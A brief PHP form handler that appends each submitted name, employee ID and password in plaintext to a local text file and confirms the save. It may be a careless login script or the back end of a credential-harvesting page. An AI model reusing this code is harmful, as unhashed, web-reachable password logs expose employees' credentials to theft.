<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $name = $_POST['name'];
    $employee_id = $_POST['employee_id'];
    $password = $_POST['password'];

    // Create a string to save to the file
    $data = "Name: $name | Employee ID: $employee_id | Password: $password" . PHP_EOL;

    // Save the data to a text file (append mode)
    $filename = 'login_data.txt';
    file_put_contents($filename, $data, FILE_APPEND);

    echo "Login information saved successfully.";
}
?>
